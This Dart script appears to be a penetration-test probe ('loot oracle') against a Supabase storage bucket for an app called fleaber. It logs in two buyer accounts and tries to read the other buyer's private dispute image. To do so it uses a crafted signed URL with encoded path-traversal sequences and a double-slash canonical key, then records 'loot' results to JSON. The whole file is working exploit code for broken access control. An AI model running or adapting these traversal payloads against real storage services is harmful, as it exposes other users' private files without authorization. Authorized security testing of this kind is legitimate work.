/// Loot oracle C1b — B1 consegue ler PNG B2 via URL persistida?
import '_rtcu.dart';

void main() async {
  final c = Rtci.fromEnv(loadEnv());
  await c.loginActors();
  await c.ensureBuyer2();

  const stored =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/order_disputes/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/eca7b51c-9fb9-4824-845b-5a27caf808e9/ok.png%252f%255corder_disputes/4064686f-1949-45fc-8806-c499d1bf0688/00000000-0000-0000-0000-00000000c2c2/rtcu-secret.png';
  const alienKey =
      'order_disputes/4064686f-1949-45fc-8806-c499d1bf0688/00000000-0000-0000-0000-00000000c2c2/rtcu-secret.png';
  const ownKey =
      'order_disputes/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/eca7b51c-9fb9-4824-845b-5a27caf808e9/ok.png';

  final getStoredB1 = await c.req('GET', stored, jwt: c.buyerJwt);
  final getStoredB2 = await c.req('GET', stored, jwt: c.buyer2Jwt);
  final getAlienB1 = await c.storageGet(alienKey, jwt: c.buyerJwt);
  final getAlienB2 = await c.storageGet(alienKey, jwt: c.buyer2Jwt);
  final getOwnB1 = await c.storageGet(ownKey, jwt: c.buyerJwt);

  bool png(HttpHit h) =>
      h.ok && (h.body.contains('PNG') || h.body.startsWith('\u0089PNG'));

  print('stored B1 ${getStoredB1.status} png=${png(getStoredB1)} len=${getStoredB1.body.length} ${clip(getStoredB1.body, 120)}');
  print('stored B2 ${getStoredB2.status} png=${png(getStoredB2)} len=${getStoredB2.body.length} ${clip(getStoredB2.body, 120)}');
  print('alien B1 ${getAlienB1.status} png=${png(getAlienB1)} len=${getAlienB1.body.length} ${clip(getAlienB1.body, 80)}');
  print('alien B2 ${getAlienB2.status} png=${png(getAlienB2)} len=${getAlienB2.body.length} ${clip(getAlienB2.body, 80)}');
  print('own B1 ${getOwnB1.status} png=${png(getOwnB1)} len=${getOwnB1.body.length}');

  // Canonical path as object key
  final canonObj =
      'object/authenticated/fleaber_private/order_disputes/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/eca7b51c-9fb9-4824-845b-5a27caf808e9/ok.png//order_disputes/4064686f-1949-45fc-8806-c499d1bf0688/00000000-0000-0000-0000-00000000c2c2/rtcu-secret.png';
  final getCanon = await c.storage('GET', canonObj, jwt: c.buyerJwt);
  print('canon-key B1 ${getCanon.status} png=${png(getCanon)} ${clip(getCanon.body, 120)}');

  await dumpJson('${outDir()}/confirm_c1b_loot.json', {
    'stored_b1': getStoredB1.brief,
    'stored_b2': getStoredB2.brief,
    'alien_b1': getAlienB1.brief,
    'alien_b2': getAlienB2.brief,
    'own_b1': getOwnB1.brief,
    'canon_key': getCanon.brief,
    'loot_png_via_stored': png(getStoredB1) || png(getStoredB2),
    'loot_alien_via_b1': png(getAlienB1),
  });
}
